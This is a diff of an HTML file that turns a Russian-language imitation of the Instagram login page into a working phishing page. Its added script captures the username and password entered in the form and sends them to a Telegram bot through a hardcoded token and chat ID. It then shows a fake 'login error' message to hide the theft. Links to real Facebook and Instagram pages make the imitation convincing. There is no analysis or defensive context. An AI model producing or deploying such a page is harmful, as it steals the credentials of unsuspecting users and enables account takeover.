@@ -1,104 +1,192 @@
-<!DOCTYPE html><html lang="ru">
+<!DOCTYPE html>
+<html lang="ru">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Instagram</title>
+  <title>Instagram Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
   <style>
-    body, html {
+    body {
+      font-family: sans-serif;
       margin: 0;
-      padding: 0;
-      background-color: #fafafa;
-      font-family: Arial, sans-serif;
-    }
-    .splash-screen {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
       background: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-    }
-    .splash-screen img {
-      width: 100px;
-      height: 100px;
+      color: #262626;
     }
     .container {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      margin-top: 50px;
+      max-width: 350px;
+      margin: 30px auto;
+      padding: 20px;
     }
-    .logo {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 15px;
+    .title {
+      font-family: 'Grand Hotel', cursive;
+      font-size: 3em;
+      text-align: center;
+      margin-bottom: 10px;
     }
-    .logo img {
-      width: 200px;
-      height: auto;
+    .subtitle {
+      text-align: center;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+    .facebook-btn {
+      background-color: #385185;
+      color: white;
+      padding: 8px;
+      text-align: center;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+    .or {
+      text-align: center;
+      margin: 10px 0;
+      font-size: 14px;
+      position: relative;
+      color: #8e8e8e;
+    }
+    .or::before,
+    .or::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      width: 40%;
+      height: 1px;
+      background: #ccc;
+    }
+    .or::before {
+      left: 0;
+    }
+    .or::after {
+      right: 0;
     }
     .form {
-      background-color: white;
-      border: 1px solid #dbdbdb;
-      padding: 40px;
-      width: 300px;
       display: flex;
       flex-direction: column;
       gap: 10px;
     }
-    .form input {
+    input {
       padding: 10px;
-      border: 1px solid #dbdbdb;
-      background-color: #fafafa;
+      border: 1px solid #ccc;
+      border-radius: 4px;
       outline: none;
     }
-    .form button {
-      padding: 10px;
+    .login-btn {
       background-color: #0095f6;
-      color: white;
-      font-weight: bold;
       border: none;
+      color: white;
+      padding: 10px;
+      border-radius: 4px;
+      font-weight: bold;
       cursor: pointer;
     }
-    .forgot-password {
-      text-align: center;
-      margin-top: 10px;
+    .forgot {
+      text-align: right;
       font-size: 12px;
-      color: #00376b;
+      color: #385185;
+      margin-top: 10px;
       cursor: pointer;
     }
     .signup {
-      margin-top: 10px;
+      text-align: center;
       font-size: 14px;
-      color: #8e8e8e;
+      margin-top: 20px;
+    }
+    .signup a {
+      color: #0095f6;
+      text-decoration: none;
+    }
+    .footer {
+      font-size: 11px;
+      text-align: center;
+      margin-top: 40px;
+      color: #999;
+    }
+
+    /* Нижняя панель */
+    .bottom-panel {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 20px;
+      background-color: #333;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+    }
+    .bottom-panel a {
+      color: #fff;
+      font-size: 20px;
+      text-align: center;
+      transition: 0.3s ease;
+    }
+    .bottom-panel a:hover {
+      color: #0095f6;
+    }
+    .active {
+      color: #0095f6;
     }
   </style>
 </head>
-<body>  <!-- Splash screen -->  <div class="splash-screen" id="splash">
-    <img src="https://i.postimg.cc/tJfRctbF/instagram-logo.png" alt="Logo" />
-  </div>  <!-- Основной сайт -->  <div class="container" id="main-site">
-    <div class="logo">
-      <img src="https://i.postimg.cc/RCWqPHkC/images.png" alt="Instagram Logo">
+<body>
+  <div class="container">
+    <div class="title">Instagram</div>
+    <div class="subtitle">Присоединяйтесь к миллионам пользователей Instagram</div>
+    <div class="facebook-btn" onclick="window.location.href='https://www.facebook.com/login/'">
+      Войти через Facebook
     </div>
-    <div class="form">
-      <input type="text" placeholder="Телефон, имя пользователя или эл. адрес">
-      <input type="password" placeholder="Пароль">
-      <div class="forgot-password">Забыли пароль?</div>
-      <button>Войти</button>
+    <div class="or">ИЛИ</div>
+    <form class="form" onsubmit="sendToTelegram(event)">
+      <input type="text" id="username" placeholder="Номер телефона, имя пользователя или эл. адрес" required>
+      <input type="password" id="password" placeholder="Пароль" required>
+      <button class="login-btn" type="submit">Войти</button>
+    </form>
+    <div class="forgot" onclick="window.location.href='https://www.instagram.com/accounts/password/reset/'">
+      Забыли пароль?
     </div>
-    <div class="signup">
-      У вас ещё нет аккаунта? <strong>Зарегистрируйтесь</strong>
+    <div class="signup">У вас нет аккаунта? <a href="https://www.instagram.com/accounts/emailsignup/">Зарегистрироваться</a></div>
+    <div class="footer">
+      Условия использования • Политика конфиденциальности • Файлы cookie
     </div>
-  </div>  <script>
-    window.addEventListener('load', () => {
-      setTimeout(() => {
-        document.getElementById('splash').style.display = 'none';
-        document.getElementById('main-site').style.display = 'flex';
-      }, 2000); // 2 секунды
-    });
-  </script></body>
+  </div>
+
+  <!-- Нижняя панель -->
+  <div class="bottom-panel">
+    <a href="#" id="home" onclick="toggleActive('home')">🏠</a>
+    <a href="#" id="chat" onclick="toggleActive('chat')">✈️</a>
+    <a href="#" id="reels" onclick="toggleActive('reels')">🎥</a>
+    <a href="#" id="search" onclick="toggleActive('search')">🔍</a>
+    <a href="#" id="profile" onclick="toggleActive('profile')">👤</a>
+  </div>
+
+  <script>
+    function sendToTelegram(event) {
+      event.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const message = `Instagram Login\n👤: ${username}\n🔑: ${password}`;
+      const token = "7884230455:AAFAojlIlO9hhyW4vMOWDcNScxnup2bYMjk";
+      const chatId = "-1002416614422";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(() => {
+        alert("Ошибка входа. Проверьте данные и попробуйте снова.");
+      });
+    }
+
+    function toggleActive(id) {
+      const allLinks = document.querySelectorAll('.bottom-panel a');
+      allLinks.forEach(link => link.classList.remove('active'));
+      const activeLink = document.getElementById(id);
+      activeLink.classList.add('active');
+    }
+  </script>
+</body>
 </html>
